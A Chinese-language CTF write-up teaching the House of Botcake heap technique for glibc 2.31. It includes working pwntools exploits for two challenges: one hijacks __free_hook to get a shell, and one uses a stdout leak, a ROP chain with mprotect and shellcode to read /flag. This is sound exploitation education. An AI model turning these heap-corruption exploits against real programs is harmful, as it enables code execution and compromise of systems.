0x00 前言
=======

在 2.29/2.27 高版本之后，glibc 为了防止攻击者简单的 Tcache Double Free，引入了对 Tcache Key 的检查。

```c
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
    /* Check to see if it's already in the tcache.  */
    tcache_entry *e = (tcache_entry *) chunk2mem (p);

    /* This test succeeds on double free.  However, we don't 100%
       trust it (it also matches random payload data at a 1 in
       2^<size_t> chance), so verify it's not an unlikely
       coincidence before aborting.  */
    if (__glibc_unlikely (e->key == tcache))
      {
        tcache_entry *tmp;
        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
        for (tmp = tcache->entries[tc_idx];
         tmp;
         tmp = tmp->next)
          if (tmp == e)
        malloc_printerr ("free(): double free detected in tcache 2");
        /* If we get here, it was a coincidence.  We've wasted a
           few cycles, but don't abort.  */
      }
```

当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 `key == tcache_key` ， 就会遍历**这个大小**的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。

从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：

1. 破坏掉被 free 的堆块中的 key，绕过检查（常用）
2. 改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries
3. **House of botcake**（常用）

House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。

此外 House of botcake 在条件合适的情况下，极其容易完成多次任意分配堆块，是相当好用的手法。

0x01 House of Botcake
=====================

1. 分配七个填充堆块（小于最大的Tcache，大于最大的Fastbin），一个辅助堆块 prev ，一个利用堆块 victim

```c
// https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);
    intptr_t *victim = malloc(0x100);
    malloc(0x10); // 防止合并
```

2. free 掉七个填充堆块，此时对应大小的 Tcache 被填满

```c
    for(int i=0; i<7; i++){
        free(x[i]);
    }
```

3. free 掉利用堆块 victim，由于此时 Tcache 被填满，victim 进入 Unsortedbin（绕过了 key 的产生）

```c
    free(victim);
```

4. free 掉辅助堆块 prev，此时俩 Unsortedbin 相邻，会触发 Unsortedbin Consolidate 合并成一个大堆块

```c
    free(prev);
```

5. 申请出一个堆块，此时会优先从 Tcache 中取出一个填充堆块腾出位置。然后再 Free 掉 victim ，victim 进入 Tcache，完成 Double Free

```c
    malloc(0x100);
    /*VULNERABILITY*/
    free(victim);// victim is already freed
    /*VULNERABILITY*/
```

最终的效果就是完成了堆块重叠，一个大的 Unsortedbin 吞着一个小的 Tcachebin。通过切割 Unsortedbin 我们分配一个比 victim 稍大的堆块 **attacker** 就可以覆写到 victim 的 next 指针，完成 Tcache Poisoning。

由于我们前期 Free 掉了多个填充堆块，此时我们同样大小的 Tcachebin 下的 count 是充足的。因此完成一次 Tcache Poisoning 后，通过 Free 掉 victim 和 attacker，再申请回来 attacker 可以再次覆写到 victim 的 next 指针，完成多次 Tcache Poinsoning。

下面从例题出发，调试分析俩种不同情形下的利用思路。

0x02 常规利用
=========

2022 JustCTF Notes
------------------

**Ubuntu GLIBC 2.31-0ubuntu9.9** 下的简单难度堆题。

### 分析

1. 首先是简单的整数溢出，get\_int() 函数返回 `unsigned __int64` 却采用 `int` 接收，通过传入 `-1` 我们可以绕过 notes 数量的限制。

![image-20220622172610108](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4e5e8b24a5f454e25542b682ea8da9494cde8b96.png)

```c
unsigned __int64 get_int()
{
  char _0[24]; // [rsp+0h] [rbp+0h] BYREF
  unsigned __int64 vars18; // [rsp+18h] [rbp+18h]

  vars18 = __readfsqword(0x28u);
  read(0, _0, 0x10uLL);
  return strtoul(_0, 0LL, 0);
}
```

2. 菜单实现了 `Add Note`，`Delete Note`，`View Note` 三个功能。

![image-20220622172758323](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-690fa9d269a33fecd571b1f8b763258bdb757ecc.png)

3. Add 函数先比较目前分配的 current\_id 和最多允许分配的 id 进行比较，然后可以分配 `0x100` 用户大小以内的堆块。

![image-20220622173154628](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-47149c6e34b39c1c865c56974c3f57bbcbf2a60d.png)

4. View 函数采用 puts 输出堆块内容。

![image-20220622173138305](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d1f7d1d2ac66e9d10b2c8e7c72bbb82753f2f4f5.png)

5. Dele 函数 free note 时没有清除 ptr 的指针，存在 **UAF** 漏洞。

![image-20220622173321788](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a2ccc67725a7ea47f08b6037ddaf985ba3b273cf.png)

### 思路

1. 传入 -1 绕过堆块数量限制
2. House of botcake 完成 Tcache Poisoning
3. 劫持 \_\_free\_hook 为 system ，简单地 getshell

### 调试

1. 申请 10 个 0x90 大小的 chunk

![image-20220622180918417](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-53590bba8a722d18dd636620d48f408443c76692.png)

2. Free 掉七个填充堆块，填满 Tcache

![image-20220622180940765](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2ea7da197aacdb22f7675fd2f4c1db1990a8ebba.png)

3. 第一次 Free victim，victim 进入 Unsortedbin，顺带利用 `View Note` Leak 出 libc

![image-20220622181006552](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c09802c6f060aa74969aa49e71a6f3341f509500.png)

4. Free 掉 Victim，触发合并，申请出一个填充堆块，给 victim 腾出位置，再次 Free victim，victim 进入 Tcachebin，完成 Double Free

![image-20220622181230142](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-48c54873e83b108fb0b3fe26eb90c1c896b6a2f5.png)

5. 此时由上图可以看到我们已经完成了堆块重叠。随后我们申请一个较大的 chunk ，分割 Unsortedbin ，覆写 victim 的 next 指针，完成 Tcache Poisoning

![image-20220622181507757](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9d8e59922b7d646de6a3bb9c761b5440272e8b3e.png)

6. 分配 chunk 到 \_\_free\_hook ，劫持其为 system ，简单地 getshell

![image-20220622181820235](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-42143496c459fbdf947d3a654d6b288bba56f216.png)

### Exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

elf = ELF('./notes')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
p = process('./notes')

def menu(choice):
    sla('> ',str(choice))

def add(size=0x80,data='u'):
    menu(1)
    sla('size: ',str(size))
    sea('content: ',str(data))

def dele(id):
    menu(2)
    sla('note id: ',str(id))

def show(id):
    menu(3)
    sla('note id: ',str(id))

'''
[*] 0. Easy Integer Overflow
'''
sla('How many notes you plan to use?','-1')

'''
[*] 1. Easy Heap Layout
'''
for i in range(10):
    add(0x80)

'''
[*] 2. Fill the Tcache
'''
for i in range(7):
    dele(7-1-i)

'''
[*] 3. Free into Unsortedbin Leak libc
'''
dele(8) # Victim
show(8)
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1ecbe0
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
libc = ELF('./libc-2.31.so',checksec=False)
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()

'''
[*] 4. Double Free into Tcache
'''
dele(7) # Prev
add() # 10
dele(8) # Victim

'''
[*] 5. Split the Unsortedbin --> Overwrite `next` Pointer --> Tcache Poisoning
'''
add(0x100,'\0'*0x80+p64(0)+p64(0x91)+p64(libc.sym.__free_hook)+p64(0)) # 11

'''
[*] 6. Hijack __free_hook --> Getshell
'''
add(0x80,'/bin/sh\0') # 12
add(0x80,p64(system_addr)) # 13 
dele(12)

p.interactive()
```

### 小结

通过本题，我们了解到了 House of botcake 的基本原理，以及单次任意分配堆块的简单 getshell 情形，下题我们将涉及到多次分配堆块、Size存在限制的较复杂 seccomp 沙箱情形。

0x03 当 Size 受限时的利用
==================

2022 CISCN 华东北赛区 Blue
---------------------

**Ubuntu GLIBC 2.31-0ubuntu9.8** 下的中等难度堆题，开了 seccomp 沙箱，ban 掉了常用的 `__malloc_hook` 和 `__free_hook` 。

### 分析

1. 首先我们通过 seccomp-tools 可以看到，本题禁用了 execve，无法简单地 getshell

![image-20220622183035574](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-44824ed07e2a9fab433c0896d58cd1857de0cdcc.png)

2. 每次进入菜单前会检测 `__malloc_hook` 和 `__free_hook` 是否被劫持，是的话调用 `_exit` 终止程序

![image-20220622183153318](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-13b238cc548dba2bb146162589eed73669bb724f.png)

3. 程序菜单实现了 `Add`，`Del`，`Show` 三项功能，除此外还有输入为 666 时仅一次可以进入的后门函数

![image-20220622183226639](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-98aa145540f8941de71fef168a3548d742433ab9.png)

4. `Add` 函数限制了用户申请的大小最大为 0x90，此处使后续 House of botcake 无法覆盖到 victim 的 next 指针

![image-20220622183448172](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9117553149e069851dfb450ee36965b4489b6192.png)

5. `Del` 函数置零了被 Free 掉的堆块

![image-20220622183551585](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-0a7537e236e22d1f85ddaf81d99619059fd0b11e.png)

6. `Show` 函数仅一次可以调用 puts 输出堆块内容

![image-20220622183633862](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3e63620e207069505d505a8c373def823096842.png)

7. 后门函数仅一次的 UAF

![image-20220622183714312](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c1db1bba10cd52bcd04241932c393bf09dd842e9.png)

### 思路

1. 由于 `Add` 函数的 size 限制，House of botcake 无法覆盖到 victim 的 next 指针，稍微调整堆布局，采用修改 victim 的堆块大小完成堆块重叠的手法，转移到重叠的大 chunk 里面完成利用的间接思路
2. 采用仅有的一次 `Show` 机会 Leak 出 libc
3. 一次 Tcache Poisoning 任意分配至 Stdout 劫持 Stdout Leak 出栈地址
4. 又一次 Tcache Poisoning 任意分配至栈上完成 ROP，改栈权限为 rwx
5. 读入执行 shellcode 获取 flag

### 调试

1. 微调堆布局，释放掉七个填充堆块，填满 Tcache

![image-20220622190045439](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1bdf0d705669448357b04f7ac54a9fc35d8be221.png)

2. 利用后门函数 UAF Free 掉我们的 victim，victim 进入 Unsortedbin，顺带利用 `Show` 函数 Leak libc

![image-20220622190116191](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8aec7567e1522850aa5fb0b0eb8b1aa482f83975.png)

3. 切割 Unsortedbin 申请较大的一个 chunk 去覆写 victim 的 size，然后 Free 掉 Victim 完成堆块重叠

![image-20220622190411490](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-047bc7c226d9de9f7f09cb539d7cb68899d2e3b1.png)

4. Free 掉 chunk2，分配一个 chunk 记作 **attacker** 切割 victim 覆盖掉重叠的 Chunk2 的 next 指针，构造 TcachePoisoning，任意分配堆块到 Stdout Leak 出栈地址（下图为已申请出 victim 未申请出 Stdout 时所截）

![image-20220622190824889](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f4e62110318cf785c9e159761f7479cc73d2b9a7.png)

5. Free 掉 **attacker**，Free 掉 chunk2 ，再次申请回 **attacker** 又一次构造 TcachePoisoning 分配堆块至栈上。事实上，可以看到我们申请到的地方和 Leak 出的地址差了一定的偏移。这个偏移我们可以在 `Add` 函数结束时的 `leave;ret` 处下断点而计算出来。

![image-20220622200318186](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-dbff500653c64c7e40965ecd2bd0e9dc723d3c44.png)

6. 这样的话在 `Add` 函数返回时就能进入我们的 ROP 流，完成控制流劫持

![image-20220622200638982](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c5c4d4a50afa7c25cc2fa944d7ce67056c3251d1.png)

7. 不失一般性，这里采用了 gets 函数来读入更多的数据以免以防题目我们无法获得更大 size 的堆块。此外采用了 `Rop --> mprotect --> shellcode` 的转化思路，以防题目沙箱比较复杂的情形。最后可以看到也是顺利地读出了我本地的 flag。

![image-20220622200922844](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b0f312a0674a7d682e401984d3d9efcd63c14af7.png)

### Exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp'])
p = process('./pwn')

def menu(c):
    sla('Choice: ',str(c))

def add(size=0x80,data='u'):
    menu(1)
    sla('Please input size: ',str(size))
    sea('Please input content: ',str(data))

def dele(id):
    menu(2)
    sla('Please input idx: ',str(id))

def show(id):
    menu(3)
    sla('Please input idx: ',str(id))

def bkdoor(id):
    menu(666)
    sla('Please input idx: ',str(id))

for i in range(10):
    add()

for i in range(7):
    dele(10-1-i)

'''
[*] House of botcake
[*] Double Free --> Modify victim's size --> Chunk Overlapping
'''
bkdoor(1)
show(1)
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1ecbe0
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
libc = ELF('./libc.so.6')
libc.address = libc_base
stdout = libc_base + 0x1ed6a0
stack_addr = libc.sym.environ
ret = libc_base + 0x0000000000022679
rdi = libc_base +0x0000000000023b6a
rsi = libc_base + 0x000000000002601f
rdx_r12 = libc_base + 0x0000000000119211
jmp_rsi = libc_base + 0x000000000010d5dd

dele(0)
add() # 0

add(0x90,'\0'*0x88+p32(0x90*8+1)) # 3
add(0x70) # 4
dele(1)

'''
[*] Tcache Poisoning --> Hijack Stdout --> leak environ addr
'''
dele(2)
add(0x50) # 1
add(0x50,'\0'*0x28+p64(0x91)+p64(stdout)+p64(0)) # 2
add() # 5
add(0x80,p64(0xfbad1800)+p64(0)*3+p64(stack_addr)+p64(stack_addr+8)*2) # 6
stack_addr = uu64(ru('\x7f',drop=False)[-6:])
lg('stack_addr',stack_addr)

'''
[*] Tcache Poinsoning --> Hijack Stack --> ROP --> Shellcode
'''
dele(5)
dele(2)
add(0x50,'\0'*0x28+p64(0x91)+p64(stack_addr-0x120)+p64(0)) # 2
add() # 5
'''
[~] Gets to input more data (Optional)
'''
payload = flat([
    rdi,stack_addr-0x108,libc.sym.gets
])
add(0x80,payload) # 7
'''
[*] Enable Shellcode
'''
mmp = flat([
    rdi,((stack_addr)>>12)<<12,rsi,0x2000,rdx_r12,7,0,libc.sym.mprotect,rdi,0,rsi,stack_addr,rdx_r12,0x100,0,libc.sym.read,jmp_rsi
])
sleep(0.5)
sl(mmp)
sleep(0.5)
sl(asm(shellcraft.cat('/flag')))

p.interactive()
```

### 小结

通过本题，我们了解到了当题目限制较多时， House of botcake 的稍复杂的利用方法，对 House of botcake 有了更深刻的认知。

0x04 总结
=======

以上就是本文的所有主要内容。

Glibc 一直在更新，防护手段一直在升级，无论是作为一个 CTF 参赛选手还是二进制漏洞研究者，掌握的利用手法多点并不是什么坏事。House of Botcake 给我们高版本 libc 下的 Tcache Double Free 提供了非常不错的思路。诚然，很多时候解决问题的途径并不止一条，我们往往可以通过多种手段来解决同一问题，但下次再遇到 Tcache Double Free 的时候，不妨考虑一下尝试 House of Botcake，满足条件的话，多次任意分配 Chunk 能够帮助节省很多时间，助力快速解出赛题。